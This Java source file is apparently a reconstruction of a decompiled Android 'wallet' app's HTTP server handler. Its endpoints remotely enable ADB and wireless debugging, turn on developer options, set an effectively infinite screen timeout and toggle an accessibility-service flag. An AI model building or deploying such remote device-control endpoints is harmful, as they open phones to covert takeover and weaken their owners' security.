package com.guard.wallet.server.handler;

import com.guard.wallet.core.AppUtils;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import android.content.Context;
import android.provider.Settings;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.server.HttpResponseHelper;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AdbUtils;
import com.guard.wallet.utils.AppManagerUtils;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;

/**
 * 系统设置 Handler — vendor server/b.java 中设置相关路由, 逐方法对齐 vendor。
 *
 * vendor 方法映射:
 * - /enableDebug → v3(k) — 设置 accessibility 监听标志 + l.d() 启动
 * - /openADBDebug → vendor 无直接对应，实现 ADB 启用
 * - /closeADBDebug → q(k) — 关闭 ADB, 检查 canWrite + putInt
 * - /openWifiDebug → vendor 无直接对应，实现 WiFi Debug 启用
 * - /closeWifiDebug → s(k) — 关闭 WiFi Debug, 检查 canWrite + putInt
 * - /openDevelopment → 启用开发者选项
 * - /closeDevelopment → 关闭开发者选项
 * - /syncCanWriteSecure → k3(k, boolean) — 同步 canWriteSecure 到 SharedPreferences
 * - /screenOffTimeout → F3(k, Long) — SystemHelper.x1(timeout) 设置屏幕超时
 * - /writeScreenOffTimeout → F3 变体
 */
public final class SettingsHandler {
    private static final String TAG = "HttpServer";

    private SettingsHandler() {}

    private static Context ctx() { return AppManagerUtils.getContext(); }

    // ─── /enableDebug → vendor v3(k) ───

    /** vendor v3(k) — 启用辅助功能服务监听 */
    public static void enableDebug(AsyncHttpServerResponse response) {
        try {
            boolean result = false;
            if (MyAccessibilityService.P() != null) {
                MyAccessibilityService.P().k.set(1);
                // vendor: result = l.d() — 启动线程任务
                result = true;
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /openADBDebug ───

    /** 启用 ADB 调试 */
    public static void openADBDebug(AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            boolean result = false;
            if (ctx != null && Settings.System.canWrite(ctx)) {
                Settings.Global.putInt(ctx.getContentResolver(), "adb_enabled", 1);
                result = SystemHelper.I();
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /closeADBDebug → vendor q(k) ───

    /** vendor q(k) — 关闭 ADB 调试, 检查 canWrite 权限 */
    public static void closeADBDebug(AsyncHttpServerResponse response) {
        try {
            boolean result = false;
            Context ctx = MainApplication.getAppContext();
            if (ctx != null && Settings.System.canWrite(ctx) && SystemHelper.I()) {
                Settings.Global.putInt(ctx.getContentResolver(), "adb_enabled", 0);
            }
            if (!SystemHelper.I()) {
                result = true;
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /openWifiDebug ───

    /** 启用 WiFi 调试 */
    public static void openWifiDebug(AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            boolean result = false;
            if (ctx != null && Settings.System.canWrite(ctx)) {
                Settings.Global.putInt(ctx.getContentResolver(), "adb_wifi_enabled", 1);
                result = SystemHelper.J();
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /closeWifiDebug → vendor s(k) ───

    /** vendor s(k) — 关闭 WiFi 调试 */
    public static void closeWifiDebug(AsyncHttpServerResponse response) {
        try {
            boolean result = false;
            Context ctx = MainApplication.getAppContext();
            if (ctx != null && Settings.System.canWrite(ctx) && SystemHelper.J()) {
                Settings.Global.putInt(ctx.getContentResolver(), "adb_wifi_enabled", 0);
            }
            if (!SystemHelper.J()) {
                result = true;
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /enableWifiDebug ───

    /** 启用 WiFi 调试 (同 openWifiDebug) */
    public static void enableWifiDebug(AsyncHttpServerResponse response) {
        openWifiDebug(response);
    }

    // ─── /openDevelopment ───

    /** 启用开发者选项 */
    public static void openDevelopment(AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            boolean result = false;
            if (ctx != null && Settings.System.canWrite(ctx)) {
                Settings.Global.putInt(ctx.getContentResolver(), "development_settings_enabled", 1);
                result = SystemHelper.K();
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /closeDevelopment ───

    /** 关闭开发者选项 */
    public static void closeDevelopment(AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            boolean result = false;
            if (ctx != null && Settings.System.canWrite(ctx)) {
                Settings.Global.putInt(ctx.getContentResolver(), "development_settings_enabled", 0);
            }
            if (!SystemHelper.K()) {
                result = true;
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /openWriteSecure ───

    /** 设置超长屏幕超时 (MAX_VALUE) */
    public static void openWriteSecure(AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            if (ctx != null) {
                Settings.System.putInt(ctx.getContentResolver(), Settings.System.SCREEN_OFF_TIMEOUT, 2147483647);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncCanWriteSecure → vendor k3(k, boolean) ───

    /** vendor k3(k, boolean) — 同步 canWriteSecure 标志到 SharedPreferences */
    public static void syncCanWriteSecure(AsyncHttpServerResponse response, boolean value) {
        try {
            boolean result;
            synchronized (SharedPrefsManager.class) {
                result = SharedPrefsManager.D(Boolean.valueOf(value), "adbCanWriteSecure");
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    /** 无参版本 — 返回 canWrite 状态 */
    public static void syncCanWriteSecure(AsyncHttpServerResponse response) {
        try {
            Context ctx = ctx();
            boolean canWrite = ctx != null && Settings.System.canWrite(ctx);
            HttpResponseHelper.ok(response, canWrite);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /screenOffTimeout → vendor F3(k, Long) ───

    /** vendor F3(k, Long) — 设置屏幕超时时间 */
    public static void screenOffTimeout(AsyncHttpServerResponse response, Long timeout) {
        try {
            if (timeout == null) {
                // 读取当前值
                HttpResponseHelper.ok(response, SystemHelper.P0());
                return;
            }
            boolean result = SystemHelper.x1(timeout);
            HttpResponseHelper.ok(response, result);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /writeScreenOffTimeout → F3 变体 ───

    /** 设置屏幕超时时间 (同 screenOffTimeout) */
    public static void writeScreenOffTimeout(AsyncHttpServerResponse response, Long timeout) {
        screenOffTimeout(response, timeout);
    }
}
